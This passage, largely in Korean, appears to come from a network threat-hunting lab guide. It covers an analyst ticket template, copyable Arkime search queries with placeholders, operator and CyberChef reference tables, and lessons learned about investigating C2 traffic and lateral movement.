INTERNAL IP/s & HOSTNAME/s:

INTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)

LATERAL DESTINATION IP/s & HOSTNAME/s: (If No Lateral Leave Blank.)

LATERAL DESTINATION PORT/s: (If No Lateral OR If Ephemeral Leave Blank.)


#EXTERNAL MACHINES#

EXTERNAL IP/s & HOSTNAME/s:

EXTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)

EXTERNAL DESTINATION PORT/s: (If Ephemeral Leave Blank.)


#SEARCH QUERIES#

ARKIME (MOLOCH):

SPLUNK:


#EVIDENCE LOCATIONS#

Team<#>: /home/<username>/<evidence folder>/<evidence filename>


#OPERATION LOG / ANALYST NOTES#

[<time>, <operator>] <what you're looking for> - <Found | Not Found | Further Analysis Required>

[Time -- Operator]

Tool Output / Notes:

[<time>, <operator>] <tool output with timestamps, src/dst, all interesting fields> + <what it means>
```

---

## 복사용 쿼리 모음 { #query-sheet }

`<…>`를 바꿔서 쓰세요. 실습 여러 개를 읽어 들였다면 검색 앞에 `tags == <lab-tag> &&`를 붙입니다.

**큰 그림 잡기**

```text
ip.dst == <server-IP>
```

```text
ip.src == <internal-CIDR> && protocols == krb5
```

```text
ip.src == <host-IP> && protocols == krb5
```

```text
ip.src == <external-IP>
```

**HTTP**

```text
ip.src == <internal-CIDR> && protocols == http
```

```text
http.bodymagic == application/x-dosexec
```

```text
http.method == POST
```

```text
http.method == POST && ip.dst == <C2-IP> && http.uri == *<string>*
```

```text
http.user-agent == "<user-agent>"
```

```text
host.http == <domain> || ip.dst == <IP-1> || ip.dst == <IP-2>
```

**숨은 채널과 인증서**

```text
ip.src == <host-IP> && ip.dst != 10.0.0.0/8 && ip.dst != 172.16.0.0/12 && ip.dst != 192.168.0.0/16 && ip.dst != 224.0.0.0/4 && port.dst != 80 && port.dst != 443 && port.dst != 53
```

```text
ip.src == <host-IP> && protocols == tls
```

```text
tags == "cert:self-signed"
```

```text
cert.issuer.cn == <name> || cert.issuer.on == "<org name>" || cert.subject.cn == [<domain-1>, <domain-2>]
```

```text
ip.src == <host-IP> && (ip.dst == <IP-1> || ip.dst == <IP-2> || cert.issuer.cn == <name>)
```

**범위 확인**

```text
ip.src == <host-IP> && ip.dst == <internal-CIDR> && ip.dst != <DC-IP>
```

```text
ip.src == <host-IP> && ip.dst == <internal-CIDR> && port.dst == [445, 135, 139, 3389, 5985]
```

```text
ip.dst == [<IOC-IP-1>, <IOC-IP-2>, <IOC-IP-3>] && ip.src != <host-IP>
```

### 연산자 요약 { #operators }

| 연산자 | 뜻 | 예 |
|---|---|---|
| `==` | 같다 | `ip.dst == 10.3.11.3` |
| `!=` | 같지 않다 | `port.dst != 443` |
| `&&` | 그리고(둘 다) | `ip.src == 10.3.11.194 && protocols == tls` |
| <code>&#124;&#124;</code> | 또는(하나라도) | <code>ip.dst == 1.2.3.4 &#124;&#124; ip.dst == 5.6.7.8</code> |
| `( )` | 묶기 | <code>ip.src == X && (A &#124;&#124; B)</code> |
| `[a, b]` | 목록 중 아무거나 | `port.dst == [445, 3389]` |
| `*` | 와일드카드 | `http.uri == *81*` |
| `"…"` | 띄어쓰기·특수문자가 있는 값 | `cert.issuer.on == "Internet Widgits Pty Ltd"` |
| `/숫자` | CIDR 대역 | `ip.dst == 10.3.11.0/24` |

### 어디를 누르나 { #where-to-click }

| 할 일 | 위치 |
|---|---|
| 필드 값과 개수 | SPI View → 섹션 → 필드 이름 클릭 또는 **Load All** |
| 값을 검색에 추가 | 값 클릭 → **and** / **or** / **and not** |
| 파일 링크 대신 본문 보기 | 세션 → **Packet Options → Hide Images & Files**, 그다음 `ascii` / `hex` |
| CyberChef용 원본 바이트 | 세션 → **Source Raw**(클라이언트 쪽) / **Destination Raw**(서버 쪽) |
| 티켓용 증거 | 세션 → **Download PCAP** |
| 데이터 시작·끝 | Sessions → **Start Time** 오름차순 / **Stop Time** 내림차순 |
| 큰 전송 구간 | 타임라인 그래프 → **Bytes** |
| 시간대 | Settings → General → Timezone Format → **UTC** |

### 사용한 CyberChef 레시피 { #cyberchef-recipes }

| 레시피 | 용도 |
|---|---|
| From Base64 | 끝이 `=` / `==`인 이상한 헤더 값 |
| URL Decode | `%2F` 같은 인코딩된 URI와 POST 본문 |
| From UNIX Timestamp (ms) | URL 속 `1583961855884` 같은 숫자 → `2020-03-11 21:24:15 UTC` |
| Detect File Type / Strings | Source/Destination Raw로 받은 본문 |
| MD5 / SHA256 | 내려받은 본문의 해시 |
| Defang URL / Defang IP Addresses | 티켓의 IOC 목록 |

---

## 교훈 { #lessons }

- **시간 범위와 시간대부터 맞추기.** "Arkime에 아무것도 안 나와요"는 대부분 Last hour 기본값 때문이고, 시간이 10시간씩 어긋나는 건 시간대 때문입니다.
- **SPI View는 세기만 하고 짝을 지어 주지 않습니다.** 숫자가 맞아떨어지는 것(POST 5 = C2 URI 5)은 **추론**입니다. 티켓에 쓰기 전에 직접 검색이나 세션 상세로 확인하세요.
- **Issuer와 Subject에 같은 이름이 있다고 자체 서명은 아닙니다.** 사슬도 그렇게 보입니다. 인증서 한 장 안에서 확인하거나 `cert:self-signed` 태그를 쓰세요.
- **헌팅 전에 잡음 걸러내기:** 윈도우 업데이트/OCSP, 폰트, CDN, 멀티캐스트, NetBIOS 브로드캐스트.
- **평문 C2는 선물입니다.** Hide Images & Files로 POST 본문을 읽으면 피해자, 훔친 계정, 공격자의 다음 행동까지 나옵니다.
- **TCP 플래그와 바이트 방향을 읽어** "연결해서 주고받음"과 "찔러 봤다가 거절됨"을 구분하세요.
- **호스트 증거와 네트워크 증거를 맞춰 보세요.** ipconfig의 MAC = Arkime의 MAC, `net view` = NetBIOS 몰림.
- **배제한 것도 증거입니다.** 무해한 외부 출발지, 거절된 SMB, 결과 0개인 범위 확인을 Not Found로 남기세요.
- **폐쇄망에서는 행동 근거를 여러 개 겹쳐서** 판단하고, 악성코드 이름은 "consistent with"로 씁니다.
- 다른 사람이 읽는 문서에서는 **비밀 정보를 가리고 IOC를 무력화**하세요.
